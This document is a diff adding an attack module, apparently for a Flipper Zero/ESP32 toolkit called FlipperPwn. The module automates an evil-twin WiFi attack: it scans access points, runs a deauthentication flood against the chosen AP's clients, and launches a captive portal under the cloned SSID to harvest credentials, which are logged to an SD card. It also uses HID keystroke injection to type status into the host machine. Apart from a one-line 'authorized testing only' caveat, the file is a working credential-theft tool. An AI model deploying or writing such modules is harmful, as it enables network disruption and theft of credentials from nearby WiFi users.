@@ -1,0 +1,95 @@
+# FlipperPwn Module — Evil Twin Attack
+# Full automated sequence: scan → clone target SSID → deauth clients → deploy captive portal
+#
+# Attack flow:
+#   1. ESP32 scans for nearby APs
+#   2. Results typed to screen via HID so you can read the AP list
+#   3. Deauth attack forces clients off the real AP
+#   4. Evil portal with matching SSID captures credentials when clients reconnect
+#
+# REQUIREMENTS:
+#   - ESP32 WiFi Dev Board running WiFi Marauder >= 1.6.0
+#   - Target BSSID must be set in BSSID option (from a prior scan)
+#   - SD card with your chosen portal HTML copied to /portals/<file>
+#   - AUTHORIZED TESTING ONLY
+#
+# USAGE:
+#   1. Run WIFI_SCAN first to get AP index numbers
+#   2. Set AP_INDEX to the index of your target AP
+#   3. Set PORTAL to the filename of your Evil Portal HTML (no path)
+#   4. Execute module
+
+NAME        evil_twin
+DESCRIPTION Scan APs, deauth target clients, deploy captive portal with cloned SSID
+CATEGORY    credential
+PLATFORMS   WIN,MAC,LINUX
+
+OPTION AP_INDEX   0              "Target AP index from scanap (0-based)"
+OPTION DEAUTH_SEC 30             "Seconds to run deauth before launching portal"
+OPTION PORTAL     hotel_wifi.html "Evil Portal HTML filename on SD card"
+OPTION LHOST      192.168.4.1    "Attack machine IP for HID output logging"
+
+# ── Phase 1: Recon ──────────────────────────────────────────────────────────
+# Scan for access points
+WIFI_SCAN
+WIFI_WAIT 8000
+
+# Open a text editor on the target machine to record scan results
+PLATFORM WIN
+  GUI r
+  DELAY 400
+  STRING notepad
+  ENTER
+  DELAY 800
+
+PLATFORM MAC
+  GUI SPACE
+  DELAY 400
+  STRING textedit
+  ENTER
+  DELAY 1000
+
+PLATFORM LINUX
+  CTRL ALT t
+  DELAY 800
+  STRING cat > /tmp/wifi_scan.txt
+  ENTER
+  DELAY 300
+
+# Type the scan results into the editor
+WIFI_RESULT
+
+# ── Phase 2: Deauth ─────────────────────────────────────────────────────────
+# Force clients off the target AP
+WIFI_DEAUTH {{AP_INDEX}}
+WIFI_WAIT {{DEAUTH_SEC}}000
+
+# ── Phase 3: Evil Twin Portal ─────────────────────────────────────────────
+# Note: evilportal command is sent to Marauder via the UART bridge.
+# The portal will clone the target SSID and serve the captive portal page.
+# Credentials captured by Marauder are saved to SD: /logs/evil_portal.log
+#
+# After execution, check /logs/evil_portal.log on the ESP32 SD card.
+
+PLATFORM WIN
+  DELAY 500
+  STRING
+  STRINGLN [Attack Status]
+  STRINGLN Deauth phase complete. Evil portal is now active.
+  STRINGLN Target AP: index {{AP_INDEX}}
+  STRINGLN Portal: {{PORTAL}}
+  STRINGLN Captured credentials will appear on Flipper screen and SD card log.
+  STRINGLN
+  STRINGLN Monitoring... (check Flipper display for captured credentials)
+
+PLATFORM MAC
+  DELAY 500
+  STRING
+  ENTER
+  STRING echo "=== Evil Twin Active ===" && echo "Portal: {{PORTAL}}" && echo "Monitor Flipper screen for captured credentials"
+  ENTER
+
+PLATFORM LINUX
+  DELAY 300
+  STRING echo "=== Evil Twin Active === Portal: {{PORTAL}}" >> /tmp/wifi_scan.txt
+  ENTER
